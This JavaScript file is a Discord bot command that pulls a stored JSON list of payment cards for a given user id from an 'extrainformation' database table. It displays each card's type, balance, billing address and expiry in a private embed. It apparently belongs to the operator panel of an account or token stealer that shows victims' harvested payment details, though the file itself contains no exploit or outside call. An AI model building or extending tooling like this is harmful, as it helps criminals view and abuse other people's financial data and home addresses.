const { EmbedBuilder } = require('discord.js');
const { queryParams } = require('../../../db/database');

const excludedCards = new Set([
    '63ded5f7-c0a7-486c-9a56-f1cc30bc64a1',
    'be4de87d-7e38-4b2d-8836-9237eb32848e',
    'cdc85313-9b57-4052-81fb-dea336132cbf',
    'b32568b1-b346-4098-9482-da5aeb470f39',
    '9adb8e8b-5e59-4637-8862-6466bfbd7761',
    '384090d0-3854-424a-be16-09e79d2e07d1',
    '34233a81-c454-420d-8e58-c48d29ebf6fc'
]);

module.exports = {
    name: "cards",
    userOnly: true,
    callback: async (client, interaction) => {
        try {
            let [t, uid] = interaction.customId.split("|");

            const cardData = await fetchCardData(uid, client);


            const embed2 = new EmbedBuilder()
            .setTitle("Cards")
            .setColor(0xb2c7e0);
            if (!cardData || cardData.length === 0) {
            return interaction.reply({
                embeds: [embed2],
                ephemeral: true
            });
            }
            
            fields = [];
            const maxFields = 24;
            let cardCount = 0;

            for (const card of cardData) {
                                if (excludedCards.has(card.id)) continue;
                if (cardCount >= maxFields) break;

                                const paymentMethod = card.paymentMethod || {};
                const details = card.details || {};
                const display = paymentMethod.display || {};
                const address = details.address || {};

                let fieldValue = `ID: ${card.id || "N/A"}\n`;
                fieldValue += `Type: ${display.name || paymentMethod.paymentMethodType || "N/A"}\n`;
                fieldValue += `Display: ${details.defaultDisplayName || display.name || "N/A"}\n`;
                
                                if (details.balance !== undefined && details.balance !== null) {
                    fieldValue += `Balance: $${parseFloat(details.balance).toFixed(2)}\n`;
                }
                
                                if (Object.keys(address).length > 0) {
                    fieldValue += `Address: ${[
                        address.address_line1,
                        address.city,
                        address.region,
                        address.postal_code,
                        address.country
                    ].filter(Boolean).join(', ')}\n`;
                }
                
                                if (details.expiryMonth && details.expiryYear) {
                    fieldValue += `Expiry: ${details.expiryMonth}/${details.expiryYear}\n`;
                }

                fields.push({
                    name: `Card #${cardCount + 1}`,
                    value: `\`\`\`${fieldValue}\`\`\``,
                    inline: true
                });

                cardCount++;
            }

                        if (fields.length === 0) {
                const embed = new EmbedBuilder()
                    .setTitle("Cards")
                    .setColor('#b2c7e0');

                return interaction.reply({
                    embeds: [embed],
                    ephemeral: true
                });
            }

            const embed = new EmbedBuilder()
                .setTitle("Cards")
                .setColor('#b2c7e0')
                .addFields(fields);

            return interaction.reply({
                embeds: [embed],
                ephemeral: true
            });

        } catch (error) {
            console.error("Error in cards command:", error);
            return interaction.reply({
                content: "An error occurred while processing cards.",
                ephemeral: true,
            });
        }
    }
};


async function fetchCardData(uid, client) {
    try {
        const result = await client.queryParams('SELECT cards FROM extrainformation WHERE uid = ?', [uid]);
        
        if (!result || result.length === 0 || !result[0].cards) {
            console.log('No card data found in database');
            return null;
        }

        try {
            const parsedData = JSON.parse(result[0].cards);
            return Array.isArray(parsedData) ? parsedData : null;
        } catch (parseError) {
            console.error('Error parsing card data:', parseError);
            return null;
        }
    } catch (dbError) {
        console.error('Database error:', dbError);
        return null;
    }
}